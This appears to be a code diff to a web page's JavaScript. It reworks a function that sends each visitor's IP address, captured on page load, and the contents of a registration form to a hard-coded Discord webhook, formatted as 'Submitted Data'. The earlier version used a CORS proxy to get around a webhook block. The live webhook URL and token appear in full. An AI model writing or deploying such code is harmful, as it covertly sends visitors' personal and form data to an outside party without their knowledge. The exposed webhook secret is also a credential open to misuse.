@@ -1,21 +1,26 @@
 function logData(eventType, data) {
     console.log(`[TEST LOG] ${eventType}:`, data);
 
-    const statusText = document.getElementById('statusText');
-    if (statusText) {
-        statusText.textContent = `IP Logged: ${data.ip || 'N/A'}`;
-    }
+    // Update IP status if available
+    const status = document.getElementById('statusText');
+    if (status) status.textContent = `IP Logged: ${data.ip || 'N/A'}`;
 
-    // Use CORS proxy to bypass Discord webhook block
-    fetch('https://corsproxy.io/?https://discord.com/api/webhooks/1388139167103582218/OTZHoiUd0w-XiBleGI5w_U8iE2rfZuQhpA6AT7Yo8n-iofiK1xWQVaxqFjEx0WBPJ6rt', {
+    // Send formatted embed to Discord webhook
+    fetch('https://discord.com/api/webhooks/1388139167103582218/OTZHoiUd0w-XiBleGI5w_U8iE2rfZuQhpA6AT7Yo8n-iofiK1xWQVaxqFjEx0WBPJ6rt', {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
         body: JSON.stringify({
-            event: eventType,
-            ...data
+            content: `📨 New **${eventType}**`,
+            embeds: [{
+                title: 'Submitted Data',
+                description: '```json\n' + JSON.stringify(data, null, 2) + '\n```',
+                color: 0x5865F2
+            }]
         })
-    }).catch((err) => {
-        console.error('Webhook failed:', err);
+    }).then(res => {
+        if (!res.ok) throw new Error(`Webhook failed: ${res.status}`);
+    }).catch(err => {
+        console.error('Webhook error:', err);
     });
 }
 
@@ -26,7 +31,7 @@ document.addEventListener('DOMContentLoaded', function () {
             logData('page_visit', { ip: data.ip });
         })
         .catch(() => {
-            logData('page_visit', { ip: 'Failed to retrieve' });
+            logData('page_visit', { ip: 'Unknown' });
         });
 
     const registerForm = document.getElementById('registerForm');
